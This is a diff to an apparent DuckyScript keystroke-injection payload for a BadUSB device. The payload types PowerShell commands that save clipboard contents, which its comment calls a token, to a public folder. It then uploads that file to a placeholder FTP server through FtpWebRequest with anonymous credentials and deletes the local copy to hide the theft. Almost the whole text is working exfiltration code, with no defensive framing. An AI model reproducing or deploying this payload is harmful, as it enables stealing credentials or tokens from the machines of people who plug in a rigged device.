@@ -70,7 +70,8 @@ ENTER
 DELAY 1000
 
 REM Upload the token to FTP server
-DEFAULTDELAY 50
+DEFAULTDELAY 10
+REM Variables
 STRING $81g =
 CTRL v
 ENTER
@@ -80,25 +81,23 @@ STRING $32f = '<FTP_URL>'
 ENTER
 STRING $81g | Out-File -FilePath C:\Users\Public\$25s
 ENTER
+
+REM FTP file prep
 STRING $ftp = [System.Net.FtpWebRequest]::Create("ftp://$32f/$25s")
-ENTER
-STRING $ftp = [System.Net.FtpWebRequest]$ftp
 ENTER
 STRING $ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
 ENTER
 STRING $ftp.Credentials = new-object System.Net.NetworkCredential("anonymous","$32f")
 ENTER
-STRING $ftp.UseBinary = $true
-ENTER
-STRING $ftp.UsePassive = $true
-ENTER
 STRING $content = [System.IO.File]::ReadAllBytes("C:\Users\Public\$25s")
 ENTER
 STRING $ftp.ContentLength = $content.Length
 ENTER
+
+REM Send file
 STRING $rs = $ftp.GetRequestStream()
 ENTER
-STRING $rs.Write($content, 0, $content.Length)
+STRING $rs.Write($content, 0, $ftp.ContentLength)
 ENTER
 STRING $rs.Close()
 ENTER
@@ -108,4 +107,3 @@ STRING Remove-Item C:\Users\Public\$25s
 ENTER
 STRING exit
 ENTER
-
